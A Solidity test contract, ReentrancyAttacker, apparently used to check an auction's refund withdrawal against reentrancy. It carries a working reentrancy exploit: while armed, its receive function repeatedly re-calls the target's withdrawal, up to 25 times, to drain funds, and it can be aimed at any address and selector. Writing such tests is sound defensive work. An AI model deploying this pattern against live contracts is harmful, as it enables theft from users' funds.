// SPDX-License-Identifier: MIT
pragma solidity 0.8.28;

/// @notice Test-only attacker that re-enters a target's refund withdrawal from `receive`.
/// @dev While unarmed it rejects ETH, which forces an auction to credit a surplus refund
///      instead of pushing it. Once armed, every ETH receipt re-enters the withdrawal call
///      until the target runs dry or MAX_REENTRIES is reached.
contract ReentrancyAttacker {
    uint256 public constant MAX_REENTRIES = 25;

    address public immutable target;
    bytes public withdrawCall;

    bool public armed;
    uint256 public reentryAttempts;
    uint256 public reentrySuccesses;

    error CallFailed(bytes reason);

    /// @param withdrawSelector Refund withdrawal function on the target.
    /// @param passSelf Whether that function takes the recipient address as its only argument.
    constructor(address target_, bytes4 withdrawSelector, bool passSelf) {
        target = target_;
        withdrawCall = passSelf
            ? abi.encodeWithSelector(withdrawSelector, address(this))
            : abi.encodeWithSelector(withdrawSelector);
    }

    function contribute() external payable {
        (bool ok, bytes memory reason) = target.call{value: msg.value}(
            abi.encodeWithSignature("contribute()")
        );
        if (!ok) {
            revert CallFailed(reason);
        }
    }

    function attack() external {
        armed = true;
        (bool ok, bytes memory reason) = target.call(withdrawCall);
        armed = false;
        if (!ok) {
            revert CallFailed(reason);
        }
    }

    receive() external payable {
        if (!armed) {
            revert("ReentrancyAttacker: refusing ETH");
        }
        if (reentryAttempts >= MAX_REENTRIES || target.balance < msg.value) {
            return;
        }
        reentryAttempts += 1;
        (bool ok, ) = target.call(withdrawCall);
        if (ok) {
            reentrySuccesses += 1;
        }
    }
}
